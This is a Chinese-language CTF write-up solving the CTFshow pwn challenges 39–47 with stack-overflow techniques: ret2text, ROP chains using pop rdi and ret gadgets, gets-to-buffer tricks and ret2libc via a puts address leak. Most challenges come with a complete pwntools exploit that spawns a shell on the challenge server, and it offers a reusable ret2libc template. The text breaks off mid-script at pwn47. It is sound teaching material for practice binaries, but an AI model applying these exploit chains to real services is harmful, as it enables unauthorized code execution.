# PWN——CTFshow

## pwn39

一个32位程序

    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

main函数的内容如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts(asc_804876C);
  puts(asc_80487E0);
  puts(asc_804885C);
  puts(asc_80488E8);
  puts(asc_8048978);
  puts(asc_80489FC);
  puts(asc_8048A90);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Stack_Overflow                                          ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : It has system and '/bin/sh',but they don't work together");
  puts("    * *************************************                           ");
  puts("Just easy ret2text&&32bit");
  ctfshow(&argc);
  puts("\nExit");
  return 0;
}
```

Hint表示system 和 '/bin/sh'并不同时起效

但是这里和之前（pwn37、pwn38）不一样：

在标准输出上输出路径 '/bin/sh'；

调用 system()函数，该函数用于执行系统命令，但这里只是输出提示信息 'You find me?'。

而前面我们遇到的直接获取 shell 的是：system("/bin/sh")

根据题目描述：32位的 system(); "/bin/sh"

system() 与 "/bin/sh" 在程序中都存在，但这里将系统函数与参数分开了，我们需要手动构造。

再回到对于栈溢出的判断

有明说是ret2text

去text段翻找

没找到什么有效内容

看到函数栏的system函数

直接反照看到system函数的位置

即：0x080483A0

![image-20250118195845901](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250118195845901.png)

又倒回去找能栈溢出的原因

```c
ssize_t ctfshow()
{
  _BYTE buf[14]; // [esp+6h] [ebp-12h] BYREF

  return read(0, buf, 0x32u);
```

在ctfshow这个函数中，存在这么个栈溢出的漏洞

漏洞产生的原因在于

这里声明了一个长度为 14 的字符数组 buf，数组大小为14字节，用来存储用户输入的数据，调用 read() 函数，从文件描述符（在这里是标准输入，文件描述符0）读取数据。read()函数的第一个参数是文件描述符，第二个参数是用来接收数据的缓冲区，第三个参数是要读取的字节数。

read() 函数试图从标准输入读取最多 0x32（十进制为50）个字节的数据到 buf 数组中，然后返回实际读取的字节数。但是，由于 buf 数组的大小只有 14 字节，这就可能导致溢出。

好了，那么对于这里需要进行填充的字符数就该是

0x12+程序中栈底的大小

因为这是个32位的程序

所以buf到栈底的位置还要再加4

所以要填充的字节数就是：

0x12+4

那么payload的一角就明晰了

结合上面的分析

可以得到

payload的构成大致是

填充字节+调用system函数+加写入/bin/sh字段

system函数的位置已知

去找/bin/sh

发现目标内容

![image-20250118200504593](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250118200504593.png)

至此，所有必备要素全部集齐

exp：

```python
from pwn import *
sh=remote('pwn.challenge.ctf.show', 28178)
payload = b'a'*(0x12+4) + p32(0x80483A0) + p32(0x8048750)
sh.sendline(payload)
sh.interactive()
```

发现并不能直接打通

说明仍然存在问题

实际上

payload 格式：

> payload = b'a'*(0x12+4) + p32(system) + p32(0) + p32(bin_sh)

首先在溢出后填入 system 函数的地址，这个地址将覆盖程序返回地址，以便控制程序流程。
此外我们需要考虑函数调用栈的结构：system函数的第一个参数通常是一个指向要执行的命令的字符串，如 /bin/sh，需要将这个字符串的地址作为参数传递给 system 函数，system 函数的第二个参数通常是一个指向空值的指针，表示没有额外的参数。在 payload 中，可以使用任意值，比如  0 ，使用 p32() 函数将地址转换为4字节的字符串，也可以用其他任意 4 字节字符，如 'aaaa'，最后再加上 bin/sh 的地址，我们就能够利用缓冲区溢出漏洞成功调用 system("/bin/sh")，从而获取到所需的 shell。

payload 详细解释：

> b'a' * (0x12 + 4)：这部分是填充，填充的目的是使得输入的长度超过了原本的缓冲区大小，触发缓冲区溢出。
> p32(system)：这部分是 system 函数的地址，在利用缓冲区溢出漏洞时，重要的一步是覆盖返回地址，使得程序返回时跳转到 system 函数。
> p32(0)：这部分是 system 函数的第二个参数，在大多数情况下，system 函数的第二个参数应该是一个指向空值的指针，表示没有额外的参数，这里使用了0，表示一个空指针。
> p32(bin_sh)：这部分是 /bin/sh 字符串的地址，作为 system 函数的第一个参数，/bin/sh 是一个用于启动 shell 的路径，在利用缓冲区溢出漏洞时，我们可以使用这个参数来告诉 system 函数要执行的命令。

所以

payload修改后即为正确的exp

即：

```python
from pwn import *
sh=remote('pwn.challenge.ctf.show', 28178)
payload = b'a'*(0x12+4) + p32(0x80483A0) + p32(0) + p32(0x8048750)
sh.sendline(payload)
sh.interactive()
```

拿到flag





## pwn40

```python
from pwn import *
io=remote("pwn.challenge.ctf.show",28267)
payload = b'a'*(0xA+8) + p64(0x4007e3) + p64(0x400808) + p64(0x4004fe) + p64(0x400520)
io.sendline(payload)
io.interactive()
```



## pwn41

已知32位

就不开checksec

main函数反编译一遍看到

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  logo(&argc);
  ctfshow();
  puts("\nExit");
  return 0;
}
```

调用ctfshow函数

看该函数

拿到buf到栈底的长度

```C
ssize_t ctfshow()
{
  _BYTE buf[14]; // [esp+6h] [ebp-12h] BYREF

  return read(0, buf, 0x32u);
}
```

即：0x12+4

溢出字节数get

现在就要找到常规的提权函数

> 找不到关键的bin/sh
>
> 32位的 system(); 但是没"/bin/sh" ，好像有其他的可以替代\

实际上，_system+"sh"在环境变量配置正确的时候和 _system+"/bin/sh"是等价的

而刚好能在其中找到sh字眼

就在useful函数中能看到sh

那么只需要确认“sh”的位置即可

双击useful函数中的“sh”直接就跳转了

拿到“sh”的位置

080487BA

再找到个_system函数地址就好

而hint函数中，就调用了system函数

那么直接用这个里的system就可以提权成功

exp：

```python
from pwn import *
sh=remote("pwn.challenge.ctf.show",28129)
system=0x080483D0  #483D0是plt表里的system，如果换用text段的system就不需要再发送'aaaa'
bin=0x080487BA
payload=b'a'*(0x12+4)+p32(system)+b'aaaa'+p32(bin)
sh.sendline(payload)
sh.interactive()
```





## pwn42

64位

和上面类似的操作

main函数查到buf到栈底的位置

0xA+8

找到sh位置

0400872

找到system函数位置

0400560

由于是64位程序

所以又出现pwn40的一个考点

64位的传参和32位不同

64位会先传入寄存器，共八个

而传完才会传入栈中

所以需要先拿到第一个参数寄存器rdi的位置

由于需要将字符"sh"返回给调用函数

所以还需要找到ret指令的位置

所以使用ROPgadget

通过指令

```C
ROPgadget --binary pwn42
```

拿到响应

```C
0x00000000004005c9 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x0000000000400597 : add al, 0 ; add byte ptr [rax], al ; jmp 0x400540
0x0000000000400577 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x400540
0x0000000000400e6f : add al, dl ; idiv bh ; jmp qword ptr [rax]
0x0000000000400eb7 : add bh, ch ; idiv edi ; call qword ptr [rdi]
0x0000000000400e97 : add bh, ch ; idiv edi ; jmp qword ptr [rax]
0x00000000004005cf : add bl, dh ; ret
0x0000000000400ef3 : add byte ptr [rax - 0x22000000], bh ; idiv edi ; jmp qword ptr [rbx]
0x0000000000400e6d : add byte ptr [rax], al ; add al, dl ; idiv bh ; jmp qword ptr [rax]
0x0000000000400eb5 : add byte ptr [rax], al ; add bh, ch ; idiv edi ; call qword ptr [rdi]
0x0000000000400e95 : add byte ptr [rax], al ; add bh, ch ; idiv edi ; jmp qword ptr [rax]
0x000000000040084d : add byte ptr [rax], al ; add bl, dh ; ret
0x000000000040084b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000400557 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x400540
0x00000000004006b8 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040067c : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400610
0x000000000040084c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040067d : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400610
0x0000000000400ef5 : add byte ptr [rax], al ; add dh, bl ; idiv edi ; jmp qword ptr [rbx]
0x0000000000400559 : add byte ptr [rax], al ; jmp 0x400540
0x0000000000400eb2 : add byte ptr [rax], al ; js 0x400eb6 ; add byte ptr [rax], al ; out dx, eax ; idiv edi ; call qword ptr [rdi]
0x0000000000400ef2 : add byte ptr [rax], al ; mov eax, 0xde000000 ; idiv edi ; jmp qword ptr [rbx]
0x0000000000400eb6 : add byte ptr [rax], al ; out dx, eax ; idiv edi ; call qword ptr [rdi]
0x0000000000400e96 : add byte ptr [rax], al ; out dx, eax ; idiv edi ; jmp qword ptr [rax]
0x0000000000400e92 : add byte ptr [rax], al ; pop rax ; add byte ptr [rax], al ; add bh, ch ; idiv edi ; jmp qword ptr [rax]
0x0000000000400606 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040067e : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400610
0x00000000004005ce : add byte ptr [rax], al ; ret
0x0000000000400eb3 : add byte ptr [rax], bh ; add byte ptr [rax], al ; out dx, eax ; idiv edi ; call qword ptr [rdi]
0x0000000000400e93 : add byte ptr [rax], bl ; add byte ptr [rax], al ; out dx, eax ; idiv edi ; jmp qword ptr [rax]
0x0000000000400e6b : add byte ptr [rax], dh ; add byte ptr [rax], al ; add al, dl ; idiv bh ; jmp qword ptr [rax]
0x0000000000400605 : add byte ptr [rax], r8b ; pop rbp ; ret
0x00000000004005cd : add byte ptr [rax], r8b ; ret
0x000000000040067f : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400610
0x0000000000400667 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400ef7 : add dh, bl ; idiv edi ; jmp qword ptr [rbx]
0x0000000000400567 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x400540
0x0000000000400668 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
0x0000000000400587 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x400540
0x000000000040053b : add esp, 8 ; ret
0x000000000040053a : add rsp, 8 ; ret
0x00000000004005fe : and byte ptr [rax], ah ; jmp rax
0x00000000004005c8 : and byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000400554 : and byte ptr [rax], al ; push 0 ; jmp 0x400540
0x0000000000400564 : and byte ptr [rax], al ; push 1 ; jmp 0x400540
0x0000000000400574 : and byte ptr [rax], al ; push 2 ; jmp 0x400540
0x0000000000400584 : and byte ptr [rax], al ; push 3 ; jmp 0x400540
0x0000000000400594 : and byte ptr [rax], al ; push 4 ; jmp 0x400540
0x0000000000400531 : and byte ptr [rax], al ; test rax, rax ; je 0x40053a ; call rax
0x00000000004006d2 : call qword ptr [rax + 0x4855c35d]
0x0000000000400291 : call qword ptr [rax - 0x4b6cb9fd]
0x0000000000400ebb : call qword ptr [rdi]
0x0000000000400538 : call rax
0x00000000004006a4 : dec ecx ; ret
0x000000000040082c : fmul qword ptr [rax - 0x7d] ; ret
0x00000000004005ca : hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000400e71 : idiv bh ; jmp qword ptr [rax]
0x0000000000400eb9 : idiv edi ; call qword ptr [rdi]
0x0000000000400e99 : idiv edi ; jmp qword ptr [rax]
0x0000000000400ef9 : idiv edi ; jmp qword ptr [rbx]
0x0000000000400683 : in eax, 0x5d ; jmp 0x400610
0x0000000000400c9c : in eax, 0x85 ; movsd dword ptr [rdi], dword ptr [rsi] ; jmp 0x2060b53b
0x0000000000400536 : je 0x40053a ; call rax
0x00000000004005f9 : je 0x400608 ; pop rbp ; mov edi, 0x602050 ; jmp rax
0x000000000040063b : je 0x400648 ; pop rbp ; mov edi, 0x602050 ; jmp rax
0x000000000040028f : jle 0x400214 ; call qword ptr [rax - 0x4b6cb9fd]
0x0000000000400c9f : jmp 0x2060b53b
0x000000000040055b : jmp 0x400540
0x0000000000400685 : jmp 0x400610
0x0000000000400dd3 : jmp qword ptr [rax - 0x2d000000]
0x0000000000400e9b : jmp qword ptr [rax]
0x0000000000400f3b : jmp qword ptr [rbp]
0x0000000000400efb : jmp qword ptr [rbx]
0x0000000000400f1b : jmp qword ptr [rdi]
0x0000000000400601 : jmp rax
0x0000000000400eb4 : js 0x400eb6 ; add byte ptr [rax], al ; out dx, eax ; idiv edi ; call qword ptr [rdi]
0x00000000004006a5 : leave ; ret
0x0000000000400662 : mov byte ptr [rip + 0x2019ff], 1 ; pop rbp ; ret
0x0000000000400572 : mov dl, 0x1a ; and byte ptr [rax], al ; push 2 ; jmp 0x400540
0x00000000004006b7 : mov eax, 0 ; pop rbp ; ret
0x0000000000400ef4 : mov eax, 0xde000000 ; idiv edi ; jmp qword ptr [rbx]
0x0000000000400682 : mov ebp, esp ; pop rbp ; jmp 0x400610
0x00000000004005fc : mov edi, 0x602050 ; jmp rax
0x0000000000400562 : mov edx, 0x6800201a ; add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x400540
0x0000000000400681 : mov rbp, rsp ; pop rbp ; jmp 0x400610
0x0000000000400592 : movabs byte ptr [0x46800201a], al ; jmp 0x400540
0x0000000000400c9e : movsd dword ptr [rdi], dword ptr [rsi] ; jmp 0x2060b53b
0x00000000004006d3 : nop ; pop rbp ; ret
0x0000000000400603 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004005cb : nop dword ptr [rax + rax] ; ret
0x0000000000400645 : nop dword ptr [rax] ; pop rbp ; ret
0x000000000040063c : or ebx, dword ptr [rbp - 0x41] ; push rax ; and byte ptr [rax], ah ; jmp rax
0x0000000000400eb8 : out dx, eax ; idiv edi ; call qword ptr [rdi]
0x0000000000400e98 : out dx, eax ; idiv edi ; jmp qword ptr [rax]
0x000000000040083c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040083e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400840 : pop r14 ; pop r15 ; ret
0x0000000000400842 : pop r15 ; ret
0x0000000000400e94 : pop rax ; add byte ptr [rax], al ; add bh, ch ; idiv edi ; jmp qword ptr [rax]
0x0000000000400684 : pop rbp ; jmp 0x400610
0x00000000004005fb : pop rbp ; mov edi, 0x602050 ; jmp rax
0x000000000040083b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040083f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400608 : pop rbp ; ret
0x0000000000400843 : pop rdi ; ret
0x0000000000400841 : pop rsi ; pop r15 ; ret
0x000000000040083d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400556 : push 0 ; jmp 0x400540
0x0000000000400566 : push 1 ; jmp 0x400540
0x0000000000400576 : push 2 ; jmp 0x400540
0x0000000000400586 : push 3 ; jmp 0x400540
0x0000000000400596 : push 4 ; jmp 0x400540
0x00000000004005fd : push rax ; and byte ptr [rax], ah ; jmp rax
0x0000000000400680 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400610
0x000000000040053e : ret
0x0000000000400542 : ret 0x201a
0x00000000004005f8 : sal byte ptr [rbp + rcx + 0x5d], 0xbf ; push rax ; and byte ptr [rax], ah ; jmp rax
0x000000000040063a : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; push rax ; and byte ptr [rax], ah ; jmp rax
0x0000000000400535 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000400665 : sbb dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400c99 : sub eax, 0x85e5202d ; movsd dword ptr [rdi], dword ptr [rsi] ; jmp 0x2060b53b
0x0000000000400c9a : sub eax, 0xa585e520 ; jmp 0x2060b53b
0x0000000000400855 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000400854 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040084a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000400534 : test eax, eax ; je 0x40053a ; call rax
0x0000000000400533 : test rax, rax ; je 0x40053a ; call rax
```

0x0000000000400843 : pop rdi ; ret

这里获取到rdi寄存器位置

（rdi寄存器的位置可以换用另外一个指令来获取位置)

```C
ROPgadget --binary pwn42 --only "pop|ret"|grep rdi
```

能更高效的筛出pop_rdi的位置

0x000000000040053e : ret

这里获取到ret指令位置

至此，全部要素集齐

payload格式为：b'a'*(0xA+8)+p64(pop_rdi)+p64(sh)+p64(ret)+p64(system)

exp:

```python
from pwn import *
u=remote("pwn.challenge.ctf.show",28237)
pop_rdi=0x0000000000400843
sh=0x0400872
ret=0x000000000040053e
system=0x0400560
payload=b'a'*(0xA+8)+p64(pop_rdi)+p64(sh)+p64(ret)+p64(system)
u.sendline(payload)
u.interactive()
```



## pwn43

32位

进main函数

发现溢出长度

0x6C+4

进hint函数，找到system

找到system的plt位置

08048450

找不到/bin/sh

只能自己构造

唯一的难点就是这里了

先用pwngdb调试

命令行输入

gdb pwn43

给main函数下断点

break main

然后开run

会拿到这个结果

```c
Breakpoint 1, 0x080487bd in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────
 EAX  0xf7faddd8 (environ) —▸ 0xffffd00c —▸ 0xffffd211 ◂— 'CLUTTER_IM_MODULE=xim'
 EBX  0x0
 ECX  0xffffcf70 ◂— 0x1
 EDX  0xffffcf94 ◂— 0x0
 EDI  0x0
 ESI  0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
 EBP  0xffffcf58 ◂— 0x0
 ESP  0xffffcf54 —▸ 0xffffcf70 ◂— 0x1
 EIP  0x80487bd (main+14) ◂— sub    esp, 4
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
 ► 0x80487bd <main+14>                    sub    esp, 4
    ↓
   0x80487e7 <__x86.get_pc_thunk.ax>      mov    eax, dword ptr [esp]
   0x80487ea <__x86.get_pc_thunk.ax+3>    ret    
    ↓
   0x80487c5 <main+22>                    add    eax, 0x283b
   0x80487ca <main+27>                    call   init <init>

   0x80487cf <main+32>                    call   logo <logo>

   0x80487d4 <main+37>                    call   ctfshow <ctfshow>

   0x80487d9 <main+42>                    mov    eax, 0
   0x80487de <main+47>                    add    esp, 4
   0x80487e1 <main+50>                    pop    ecx
   0x80487e2 <main+51>                    pop    ebp
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp  0xffffcf54 —▸ 0xffffcf70 ◂— 0x1
01:0004│ ebp  0xffffcf58 ◂— 0x0
02:0008│      0xffffcf5c —▸ 0xf7decfa1 (__libc_start_main+241) ◂— add    esp, 0x10
03:000c│      0xffffcf60 —▸ 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
... ↓
05:0014│      0xffffcf68 ◂— 0x0
06:0018│      0xffffcf6c —▸ 0xf7decfa1 (__libc_start_main+241) ◂— add    esp, 0x10
07:001c│ ecx  0xffffcf70 ◂— 0x1
───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
```

再用vmmap查内存段的权限信息

得到

```c
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /home/ctfshow/Desktop/xd/pwn43
 0x804a000  0x804b000 r--p     1000 1000   /home/ctfshow/Desktop/xd/pwn43
 0x804b000  0x804c000 rw-p     1000 2000   /home/ctfshow/Desktop/xd/pwn43
0xf7dd4000 0xf7fa9000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7fa9000 0xf7faa000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7faa000 0xf7fac000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fac000 0xf7fad000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fad000 0xf7fb0000 rw-p     3000 0      
0xf7fcf000 0xf7fd1000 rw-p     2000 0      
0xf7fd1000 0xf7fd4000 r--p     3000 0      [vvar]
0xf7fd4000 0xf7fd6000 r-xp     2000 0      [vdso]
0xf7fd6000 0xf7ffc000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7ffc000 0xf7ffd000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7ffd000 0xf7ffe000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
0xfffdd000 0xffffe000 rw-p    21000 0      [stack]
```

-p 标志表示内存区域的权限，它由四个字符组成，每个字符分别代表一个权限：

r：可读（Readable）
w：可写（Writable）
x：可执行（Executable）
s：共享（Shared）

0x804b000  0x804c000 rw-p     1000 2000   /home/ctfshow/Desktop/xd/pwn43

这里就是可以读写的

在这个区间就能找到buf2

这里就可以作为我们构造的/bin/sh的所在

buf2的位置为

0804B060

那么我们就只差个输入函数的位置

实际上，细看ctfshow这个函数

里面有用到一个输入函数

gets函数

找到gets函数的位置

08048420

那么payload的构造就出来了

payload=b'a'*(0x6C+4)+p32(gets)+p32(system)+p32(buf2)+p32(buf2)

payload里的两个buf2分别作为gets函数和system函数的参数

具体原因参考大佬文

关于这个 payload 的详细解释：

在函数调用中，参数会按照一定的顺序压入栈中，然后函数会依次读取这些参数。

b'a'*offset：这部分是填充数据，长度为 offset，目的是为了覆盖函数的返回地址，并确保我们能够控制程序的执行流程。

p32(gets_addr)：这是 gets() 函数的地址，我们将覆盖函数返回地址为 gets() 函数的地址，这样在程序返回时会跳转到 gets() 函数执行，我们就可以利用 gets() 函数从输入中获取数据。 p32(system_addr)：这是 system() 函数的地址，我们将覆盖 gets() 函数的返回地址为 system() 函数的地址，这样在 gets() 函数执行完毕后，程序会继续执行 system() 函数。

而后面的两个 p32(buf2_addr) 分别作为 gets 函数与 system 函数的参数

第一个参数是用 gets() 函数读取的数据，也就是我们要写的 buf2 的地址（写入后 buf2 的地址也就是 "/bin/sh" 字符串的地址）；
第二个参数也是 "/bin/sh" 字符串的地址，因为 system() 函数会使用这个地址作为命令参数

原文链接：https://blog.csdn.net/Myon5/article/details/138167444

所以exp：

```python
from pwn import *
u=remote("pwn.challenge.ctf.show",28166)
gets=0x08048420
system=0x08048450
buf2=0x0804B060
payload=b'a'*(0x6C+4)+p32(gets)+p32(system)+p32(buf2)+p32(buf2)
u.sendline(payload)
u.sendline("/bin/sh")
u.interactive()
```

## pwn44

64位

ctfshow函数中，拿到溢出字符长度

0xA+8

找到gets函数

即输入函数，能手动传入"/bin/sh"的函数

```c
0x00400530
```

pwngdb调试

得到

```C
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /home/ctfshow/Desktop/xd/pwn44
          0x601000           0x602000 r--p     1000 1000   /home/ctfshow/Desktop/xd/pwn44
          0x602000           0x603000 rw-p     1000 2000   /home/ctfshow/Desktop/xd/pwn44
    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7bc9000     0x7ffff7dc9000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dc9000     0x7ffff7dcd000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000 0      
    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7fd6000     0x7ffff7fd8000 rw-p     2000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall
```

去翻0x602000           0x603000 rw-p     1000 2000   /home/ctfshow/Desktop/xd/pwn44

找到buf2位置

```c
0x00602080
```

64位程序

所以需要得知ret和rdi的位置

ROPgadget指令

拿到rdi位置

0x00000000004007f3 : pop rdi ; ret

拿到ret位置

0x00000000004004fe : ret

现在就只需要找到system函数即可

在hint函数中拿到

0x00400520

集齐所有要素，exp：

```python
from pwn import *
u=remote("pwn.challenge.ctf.show",28132)
pop_rdi=0x00000000004007f3
ret=0x00000000004004fe
system=0x00400520
gets=0x00400530
buf2=0x00602080
payload=b'a'*(0xA+8)+p64(pop_rdi)+p64(buf2)+p64(ret)+p64(gets)+p64(pop_rdi)+p64(buf2)+p64(ret)+p64(system)
u.sendline(payload)
u.sendline("/bin/sh")
u.interactive()
```



## pwn45

ctfshow的第一道ret2libc

借用夏师傅博客的板子（再从其他佬的博客那补了点注释

```python
from pwn import *
from LibcSearcher import *

io = remote('', )
# io = process("")
elf = ELF('')
# libc= ELF('libc.so.6')
# 加载ELF（可执行和可链接格式）二进制文件到elf对象中，使我们能够轻松访问符号、地址和段
main_add =
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ", hex(puts_got))
print("Puts_plt: ", hex(puts_plt))

offset =

payload1 = b'a' * (offset + 4) + p32(puts_plt) + p32(main_add) + p32(puts_got)
io.sendlineafter(b'', payload1)
puts_addr = u32(io.recvuntil(b'\xf7')[-4:])     
# 接收数据，直到遇到字节\xf7（在32位系统中，很多共享库（如libc）的地址高字节是\xf7）
# 取接收到的数据的最后 4 个字节，因为 puts 函数的地址是 32 位（4 个字节）
# 泄露 puts 函数在 GOT 表中的实际地址
print("Puts_addr: ", hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)

libc_base = puts_addr - libc.dump('puts')
system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset + 4) + p32(system_add) + p32(0x0) + p32(bin_sh_add)
# 0x0作为占位符填充返回地址的后续字节，以确保返回地址被正确覆盖
io.sendlineafter(b'', payload2)

io.interactive()
```

填写板子

exp：

```python
from pwn import *
from LibcSearcher import *

io = remote('pwn.challenge.ctf.show',28269)
# io = process("")
elf = ELF('./pwn45')
# libc= ELF('libc.so.6')

main_add =0x0804866D
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ", hex(puts_got))
print("Puts_plt: ", hex(puts_plt))

offset =0x6B

payload1 = b'a' * (offset + 4) + p32(puts_plt) + p32(main_add) + p32(puts_got)
io.sendlineafter(b'O.o?', payload1)
puts_addr = u32(io.recvuntil(b'\xf7')[-4:])
print("Puts_addr: ", hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)

libc_base = puts_addr - libc.dump('puts')
system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset + 4) + p32(system_add) + p32(0x0) + p32(bin_sh_add)
io.sendlineafter(b'', payload2)

io.interactive()
```

拿到flag

## pwn46

```python
from pwn import *
from LibcSearcher import *

io = remote('pwn.challenge.ctf.show',28253)
# io=process("./pwn")
elf = ELF('./pwn46')
# libc= ELF(elf.libc.path)

ret_add =0x00000000004004fe
pop_rdi =0x0000000000400803
main_add =0x000000000040073E
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ",hex(puts_got))
print("Puts_plt: ",hex(puts_plt))

offset=0x70

payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
io.sendlineafter(b'O.o?', payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("Puts_addr: ",hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)   # libc6_2.27-0ubuntu2_amd64

libc_base = puts_addr - libc.dump('puts')
system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)

io.sendlineafter(b'O.o?', payload2)

io.interactive()
```

64位，在32位的基础上补rdi补ret改offset改main函数地址就好了

## pwn47

根据32位的板子改

改完即为完整exp：

```python
from pwn import *
from LibcSearcher import *

io = remote('pwn.challenge.ctf.show',28169 )
# io = process("")
elf = ELF('./pwn47')
# libc= ELF('libc.so.6')

main_add =0x080486B9
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ", hex(puts_got))
print("Puts_plt: ", hex(puts_plt))

offset =0x9C

payload1 = b'a' * (offset + 4) + p32(puts_plt) + p32(main_add) + p32(puts_got)
io.sendlineafter(b'time:', payload1)
puts_addr = u32(io.recvuntil(b'\xf7')[-4:])
print("Puts_addr: ", hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)

libc_base = puts_addr - libc.dump('puts')
